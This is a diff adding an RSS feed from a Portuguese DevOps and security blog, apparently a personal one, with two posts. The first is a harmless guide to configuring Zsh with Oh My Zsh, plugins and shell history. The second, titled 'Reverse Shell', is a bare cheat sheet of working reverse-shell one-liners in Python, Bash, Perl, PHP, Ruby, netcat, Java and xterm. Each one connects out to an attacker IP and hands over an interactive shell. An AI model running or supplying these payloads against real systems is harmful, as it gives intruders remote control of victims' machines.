@@ -1,0 +1,63 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
+    <title>Shell on FXShell - DevOps &amp; Sec</title>
+    <link>https://fxshelll.github.io/tags/shell/</link>
+    <description>Recent content in Shell on FXShell - DevOps &amp; Sec</description>
+    <ttl>1440</ttl>
+    <generator>Hugo 0.152.2</generator>
+    <language>pt-br</language>
+    <lastBuildDate>Mon, 30 Mar 2026 16:45:53 UT</lastBuildDate>
+    <atom:link href="https://fxshelll.github.io/tags/shell/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Seu terminal pode ser muito mais produtivo com Zsh</title>
+      <link>https://fxshelll.github.io/posts/zsh-terminal-produtivo/</link>
+      <pubDate>Mon, 30 Mar 2026 03:00:00 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/zsh-terminal-produtivo/</guid>
+      <description>Se você passa boa parte do dia no terminal, vale muito a pena investir alguns minutos configurando o Zsh com Oh My Zsh. A diferença na produtividade é real — autocomplete inteligente, highlight de sintaxe, histórico gigante e plugins que evitam você digitar a mesma coisa mil vezes.
+Esse post é baseado na minha configuração pessoal do .zshrc. Bora ver o que tem dentro.
+Instalando o Zsh e Oh My Zsh # Instalar o Zsh (Debian/Ubuntu) sudo apt install zsh # Definir como shell padrão chsh -s $(which zsh) # Instalar o Oh My Zsh sh -c &#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&#34; Tema O tema padrão que uso é o robbyrussell — simples, limpo e mostra o branch do git direto no prompt.
+</description>
+      <content:encoded><![CDATA[Se você passa boa parte do dia no terminal, vale muito a pena investir alguns minutos configurando o Zsh com Oh My Zsh. A diferença na produtividade é real — autocomplete inteligente, highlight de sintaxe, histórico gigante e plugins que evitam você digitar a mesma coisa mil vezes.
+Esse post é baseado na minha configuração pessoal do .zshrc. Bora ver o que tem dentro.
+Instalando o Zsh e Oh My Zsh # Instalar o Zsh (Debian/Ubuntu) sudo apt install zsh # Definir como shell padrão chsh -s $(which zsh) # Instalar o Oh My Zsh sh -c &#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&#34; Tema O tema padrão que uso é o robbyrussell — simples, limpo e mostra o branch do git direto no prompt.
+ZSH_THEME=&#34;robbyrussell&#34; Se quiser algo mais visual com ícones e informações de contexto (k8s, cloud, etc.), vale testar o Powerlevel10k:
+# Instalar o Powerlevel10k git clone --depth=1 https://github.com/romkatv/powerlevel10k.git \ ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k # No .zshrc: ZSH_THEME=&#34;powerlevel10k/powerlevel10k&#34; Plugins essenciais plugins=( git dnf zsh-syntax-highlighting zsh-autosuggestions ) zsh-autosuggestions Sugere comandos em cinza enquanto você digita, baseado no seu histórico. Pressione → para aceitar. Um dos plugins mais úteis que existem.
+git clone https://github.com/zsh-users/zsh-autosuggestions \ ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions zsh-syntax-highlighting Colore os comandos em tempo real — verde se o comando existe, vermelho se não existe. Evita muito erro de digitação.
+git clone https://github.com/zsh-users/zsh-syntax-highlighting.git \ ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting git Plugin built-in do Oh My Zsh. Traz dezenas de aliases prontos:
+gst # git status gco # git checkout gcmsg # git commit -m gp # git push gl # git pull glog # git log bonito Histórico gigante e inteligente Essa é uma das partes que mais uso. Um histórico bem configurado vale ouro — principalmente quando você precisa lembrar aquele comando raro que rodou meses atrás.
+HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history SAVEHIST=1000000 HISTSIZE=1000000 HIST_STAMPS=&#34;yyyy-mm-dd&#34; setopt INC_APPEND_HISTORY # Grava no arquivo imediatamente (não só ao fechar o shell) setopt SHARE_HISTORY # Compartilha histórico entre todas as sessões abertas setopt HIST_EXPIRE_DUPS_FIRST # Remove duplicatas primeiro quando o histórico encher setopt HIST_IGNORE_DUPS # Não grava se o comando foi o mesmo do anterior setopt HIST_IGNORE_ALL_DUPS # Remove entradas antigas se o mesmo comando for repetido setopt HIST_FIND_NO_DUPS # Não mostra duplicatas ao navegar com ↑ setopt HIST_IGNORE_SPACE # Não grava comandos que começam com espaço (útil para senhas) setopt HIST_SAVE_NO_DUPS # Não escreve duplicatas no arquivo de histórico setopt HIST_REDUCE_BLANKS # Remove espaços desnecessários antes de gravar alias history=&#34;history 0&#34; # Mostra o histórico completo (sem limite de linhas) O HIST_IGNORE_SPACE é especialmente útil: qualquer comando precedido de espaço não entra no histórico — ótimo pra quando você cola uma senha ou token diretamente no terminal.
+fzf — busca fuzzy no histórico O fzf transforma o Ctrl+R em uma busca interativa e fuzzy pelo histórico inteiro. Essencial.
+# Instalar sudo apt install fzf # ou via git git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf &amp;&amp; ~/.fzf/install No .zshrc:
+[ -f ~/.fzf.zsh ] &amp;&amp; source ~/.fzf.zsh Depois é só apertar Ctrl+R e digitar qualquer trecho do comando que você procura.
+Meu .zshrc completo export ZSH=&#34;$HOME/.oh-my-zsh&#34; ZSH_THEME=&#34;robbyrussell&#34; HISTFILE=${ZDOTDIR:-$HOME}/.zsh_history SAVEHIST=1000000 HISTSIZE=1000000 HIST_STAMPS=&#34;yyyy-mm-dd&#34; setopt INC_APPEND_HISTORY setopt SHARE_HISTORY setopt HIST_EXPIRE_DUPS_FIRST setopt HIST_IGNORE_DUPS setopt HIST_IGNORE_ALL_DUPS setopt HIST_FIND_NO_DUPS setopt HIST_IGNORE_SPACE setopt HIST_SAVE_NO_DUPS setopt HIST_REDUCE_BLANKS alias history=&#34;history 0&#34; plugins=( git dnf zsh-syntax-highlighting zsh-autosuggestions ) source $ZSH/oh-my-zsh.sh [ -f ~/.fzf.zsh ] &amp;&amp; source ~/.fzf.zsh export NVM_DIR=&#34;$HOME/.nvm&#34; [ -s &#34;$NVM_DIR/nvm.sh&#34; ] &amp;&amp; \. &#34;$NVM_DIR/nvm.sh&#34; [ -s &#34;$NVM_DIR/bash_completion&#34; ] &amp;&amp; \. &#34;$NVM_DIR/bash_completion&#34; export PATH=&#34;$HOME/.local/bin:$PATH&#34; Com isso você já tem um terminal muito mais agradável de usar. Os plugins de autosuggestions e syntax highlighting sozinhos já valem a instalação. O histórico inteligente é o tipo de coisa que você sente falta quando usa uma máquina sem ele.
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Reverse Shell</title>
+      <link>https://fxshelll.github.io/posts/dicasdereverseshell/</link>
+      <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
+      <dc:creator>Felipe da Matta</dc:creator>
+      <guid>https://fxshelll.github.io/posts/dicasdereverseshell/</guid>
+      <description>Python =====================
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Bash =====================
+bash -i &gt;&amp; /dev/tcp/192.168.19.68/4455 0&gt;&amp;1 PERL =====================
+perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; PHP =====================
+php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; Ruby =====================
+ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; Netcat =====================
+nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f Java =====================
+r = Runtime.getRuntime() p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[]) p.waitFor()[Untested submission from anonymous reader] xterm =====================
+</description>
+      <content:encoded><![CDATA[Python =====================
+python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Bash =====================
+bash -i &gt;&amp; /dev/tcp/192.168.19.68/4455 0&gt;&amp;1 PERL =====================
+perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; PHP =====================
+php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; Ruby =====================
+ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; Netcat =====================
+nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f Java =====================
+r = Runtime.getRuntime() p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[]) p.waitFor()[Untested submission from anonymous reader] xterm =====================
+xterm -display 10.0.0.1:1 Xnest :1 xhost +targetip ]]></content:encoded>
+    </item>
+  </channel>
+</rss>
